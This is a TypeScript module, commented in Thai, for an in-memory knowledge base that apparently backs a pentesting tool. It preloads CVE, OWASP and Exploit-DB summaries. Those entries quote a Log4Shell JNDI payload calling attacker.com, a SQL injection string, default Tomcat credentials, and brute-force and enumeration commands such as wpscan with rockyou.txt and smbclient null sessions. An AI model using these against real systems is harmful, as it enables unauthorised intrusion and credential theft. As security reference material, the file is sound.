import { randomUUID } from "crypto";

// ─── Database & Knowledge Architecture (3-layer) ────────────────────
// Layer 1: Relational DB (PostgreSQL) - User, Targets, Audit Logs, Findings
// Layer 2: Vector DB (Qdrant/ChromaDB/Pgvector) - CVE, Exploit-DB, OWASP
// Layer 3: State Store (Redis) - Active Session State, Rate Limiting
//
// ระบบนี้เป็น In-memory Vector Store ที่จำลองการทำงานของ Vector DB
// สำหรับเก็บ CVE Datasets, Exploit-DB Index, OWASP Cheatsheets
// และทำ Vector Search สำหรับ Chat History

export type KnowledgeCategory =
  | "cve"
  | "exploit"
  | "owasp"
  | "nuclei_template"
  | "chat_history"
  | "target_memory"
  | "finding";

export interface KnowledgeEntry {
  id: string;
  category: KnowledgeCategory;
  title: string;
  content: string;
  metadata: Record<string, any>;
  tags: string[];
  embedding: number[]; // simple hash-based embedding for demo
  createdAt: Date;
  source?: string;
}

// ─── Simple hash-based embedding ────────────────────────────────────
// ใน production จะใช้ real embedding model (e.g. sentence-transformers)
// แต่สำหรับ demo นี้ใช้ character n-gram hashing แทน

function hashString(str: string): number {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = (hash << 5) - hash + str.charCodeAt(i);
    hash |= 0;
  }
  return Math.abs(hash);
}

function computeEmbedding(text: string, dim = 64): number[] {
  const embedding = new Array(dim).fill(0);
  const tokens = text.toLowerCase().split(/[^a-z0-9]+/).filter(Boolean);
  for (const token of tokens) {
    const idx = hashString(token) % dim;
    embedding[idx] += 1;
  }
  // Normalize
  const norm = Math.sqrt(embedding.reduce((s, v) => s + v * v, 0)) || 1;
  return embedding.map((v) => v / norm);
}

function cosineSimilarity(a: number[], b: number[]): number {
  if (a.length !== b.length) return 0;
  let dot = 0;
  for (let i = 0; i < a.length; i++) dot += a[i] * b[i];
  return dot;
}

// ─── Knowledge Base Manager ─────────────────────────────────────────

export class KnowledgeBase {
  private entries: KnowledgeEntry[] = [];
  private maxEntries: number;

  constructor(maxEntries = 10_000) {
    this.maxEntries = maxEntries;
  }

  // Add a knowledge entry
  add(params: {
    category: KnowledgeCategory;
    title: string;
    content: string;
    metadata?: Record<string, any>;
    tags?: string[];
    source?: string;
  }): KnowledgeEntry {
    const entry: KnowledgeEntry = {
      id: randomUUID(),
      category: params.category,
      title: params.title,
      content: params.content,
      metadata: params.metadata ?? {},
      tags: params.tags ?? [],
      embedding: computeEmbedding(`${params.title} ${params.content}`),
      createdAt: new Date(),
      source: params.source,
    };

    this.entries.push(entry);

    // Trim if over max
    if (this.entries.length > this.maxEntries) {
      this.entries = this.entries.slice(-this.maxEntries);
    }

    return entry;
  }

  // Vector search - find most similar entries
  search(query: string, options: {
    category?: KnowledgeCategory;
    limit?: number;
    minScore?: number;
    tags?: string[];
  } = {}): Array<{ entry: KnowledgeEntry; score: number }> {
    const queryEmbedding = computeEmbedding(query);
    const limit = options.limit ?? 5;
    const minScore = options.minScore ?? 0.1;

    const results = this.entries
      .filter((e) => {
        if (options.category && e.category !== options.category) return false;
        if (options.tags && options.tags.length > 0) {
          if (!options.tags.some((t) => e.tags.includes(t))) return false;
        }
        return true;
      })
      .map((entry) => ({
        entry,
        score: cosineSimilarity(queryEmbedding, entry.embedding),
      }))
      .filter((r) => r.score >= minScore)
      .sort((a, b) => b.score - a.score)
      .slice(0, limit);

    return results;
  }

  // Get entries by category
  getByCategory(category: KnowledgeCategory, limit = 100): KnowledgeEntry[] {
    return this.entries
      .filter((e) => e.category === category)
      .slice(-limit);
  }

  // Get entry by ID
  getById(id: string): KnowledgeEntry | undefined {
    return this.entries.find((e) => e.id === id);
  }

  // Get all entries
  getAll(): KnowledgeEntry[] {
    return this.entries;
  }

  // Get count
  getCount(): number {
    return this.entries.length;
  }

  // Clear all entries
  clear(): void {
    this.entries = [];
  }

  // ─── Preload common knowledge ─────────────────────────────────────

  preloadCveKnowledge(): void {
    const cves = [
      {
        id: "CVE-2021-44228",
        title: "Log4Shell - Apache Log4j RCE",
        content: "Remote code execution in Apache Log4j 2.x via JNDI injection in log messages. " +
          "Payload: ${jndi:ldap://attacker.com/exploit}. Affects versions 2.0-beta9 to 2.14.1.",
        tags: ["rce", "java", "log4j", "jndi"],
        source: "NVD",
      },
      {
        id: "CVE-2017-0144",
        title: "EternalBlue - SMBv1 RCE",
        content: "Remote code execution in Microsoft SMBv1 server. Used by WannaCry ransomware. " +
          "Exploit via MS17-010. Affects Windows XP through Server 2008 R2.",
        tags: ["rce", "windows", "smb", "eternalblue"],
        source: "NVD",
      },
      {
        id: "CVE-2019-0708",
        title: "BlueKeep - RDP RCE",
        content: "Remote code execution in Windows Remote Desktop Services. " +
          "Unauthenticated attacker can execute arbitrary code via crafted RDP requests. " +
          "Affects Windows 7, Server 2008 R2, Server 2008.",
        tags: ["rce", "windows", "rdp", "bluekeep"],
        source: "NVD",
      },
      {
        id: "CVE-2021-34527",
        title: "PrintNightmare - Windows Print Spooler RCE",
        content: "Remote code execution in Windows Print Spooler service. " +
          "Allows authenticated attacker to run arbitrary code with SYSTEM privileges. " +
          "Affects all Windows versions.",
        tags: ["rce", "windows", "printspooler", "privilege-escalation"],
        source: "NVD",
      },
      {
        id: "CVE-2023-44487",
        title: "HTTP/2 Rapid Reset DoS",
        content: "HTTP/2 protocol vulnerability allowing rapid stream cancellation to cause DoS. " +
          "Attacker sends many requests then immediately cancels them, exhausting server resources.",
        tags: ["dos", "http2", "protocol"],
        source: "NVD",
      },
    ];

    for (const cve of cves) {
      this.add({
        category: "cve",
        title: cve.title,
        content: cve.content,
        metadata: { cveId: cve.id },
        tags: cve.tags,
        source: cve.source,
      });
    }
  }

  preloadOwaspKnowledge(): void {
    const owasp = [
      {
        title: "OWASP Top 10 - A01:2021 Broken Access Control",
        content: "Access control enforces policy such that users cannot act outside of their intended permissions. " +
          "Failures typically lead to unauthorized information disclosure, modification, or destruction of all data.",
        tags: ["access-control", "authorization", "idor"],
      },
      {
        title: "OWASP Top 10 - A03:2021 Injection",
        content: "Injection flaws such as SQL, NoSQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter. " +
          "SQL injection: ' OR '1'='1. Mitigation: parameterized queries, input validation.",
        tags: ["injection", "sql", "sqli", "command-injection"],
      },
      {
        title: "OWASP Top 10 - A05:2021 Security Misconfiguration",
        content: "Security misconfiguration includes missing security hardening, overly permissive CORS, " +
          "unnecessary features enabled, default accounts, error messages revealing stack traces.",
        tags: ["misconfiguration", "cors", "default-credentials"],
      },
      {
        title: "OWASP Top 10 - A07:2021 Identification and Authentication Failures",
        content: "Authentication failures include credential stuffing, brute force, weak passwords, " +
          "session fixation, and missing MFA. Mitigation: rate limiting, MFA, strong password policy.",
        tags: ["authentication", "brute-force", "session", "mfa"],
      },
      {
        title: "OWASP Top 10 - A08:2021 Software and Data Integrity Failures",
        content: "Integrity failures include insecure deserialization, untrusted data in CI/CD, " +
          "and auto-update without integrity verification. Deserialization can lead to RCE.",
        tags: ["deserialization", "integrity", "rce"],
      },
    ];

    for (const item of owasp) {
      this.add({
        category: "owasp",
        title: item.title,
        content: item.content,
        tags: item.tags,
        source: "OWASP",
      });
    }
  }

  preloadExploitKnowledge(): void {
    const exploits = [
      {
        title: "Exploit-DB: Apache Tomcat Manager Brute Force",
        content: "Default credentials on Tomcat Manager (tomcat:tomcat, admin:admin). " +
          "Once authenticated, deploy WAR file for RCE. Use hydra or medusa for brute force.",
        tags: ["tomcat", "brute-force", "war", "rce"],
      },
      {
        title: "Exploit-DB: WordPress wp-login Brute Force",
        content: "Brute force WordPress login via wp-login.php. Use wpscan --enumerate u " +
          "to enumerate users first, then wpscan --passwords rockyou.txt.",
        tags: ["wordpress", "brute-force", "wpscan"],
      },
      {
        title: "Exploit-DB: SMB Null Session Enumeration",
        content: "Null session allows unauthenticated enumeration of SMB shares and users. " +
          "Use enum4linux -a target or smbclient -L //target/ -N.",
        tags: ["smb", "enumeration", "null-session"],
      },
      {
        title: "Exploit-DB: SSH User Enumeration",
        content: "SSH user enumeration via timing differences in authentication responses. " +
          "Use metasploit auxiliary/scanner/ssh/ssh_enumusers.",
        tags: ["ssh", "enumeration", "metasploit"],
      },
    ];

    for (const exp of exploits) {
      this.add({
        category: "exploit",
        title: exp.title,
        content: exp.content,
        tags: exp.tags,
        source: "Exploit-DB",
      });
    }
  }
}

// ─── Singleton instance ─────────────────────────────────────────────

let knowledgeBaseInstance: KnowledgeBase | null = null;

export function getKnowledgeBase(): KnowledgeBase {
  if (!knowledgeBaseInstance) {
    knowledgeBaseInstance = new KnowledgeBase();
    // Preload common knowledge on first access
    knowledgeBaseInstance.preloadCveKnowledge();
    knowledgeBaseInstance.preloadOwaspKnowledge();
    knowledgeBaseInstance.preloadExploitKnowledge();
  }
  return knowledgeBaseInstance;
}
